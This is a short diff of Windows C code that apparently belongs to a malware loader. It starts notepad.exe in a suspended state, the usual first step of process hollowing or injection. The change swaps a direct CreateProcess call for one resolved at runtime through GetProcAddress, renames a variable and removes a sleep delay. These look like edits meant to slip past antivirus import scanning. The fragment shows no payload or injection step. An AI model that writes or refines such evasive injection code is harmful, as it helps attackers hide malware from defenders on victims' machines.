@@ -23,13 +23,26 @@ CryptReleaseContext(hProv, 0);
 }
 
 int main() {
-    Sleep(3000);
 
-    STARTUPINFO si = {0};
+    STARTUPINFO ga = {0};
     PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
+    ga.cb = sizeof(ga);
 
-    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    BOOL (*pCreateProcess)(
+        LPCSTR lpApplicationName,
+        LPSTR lpCommandLine,
+        LPSECURITY_ATTRIBUTES lpProcessAttributes,
+        LPSECURITY_ATTRIBUTES lpThreadAttributes,
+        BOOL bInheritHandles,
+        DWORD dwCreationFlags,
+        LPVOID lpEnvironment,
+        LPCSTR lpCurrentDirectory,
+        LPSTARTUPINFOA lpStartupInfo,
+        LPPROCESS_INFORMATION lpProcessInformation
+    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
+        GetProcAddress(hKernel32, "CreateProcessA");
+
+    pCreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &ga, &pi);
       
 
     
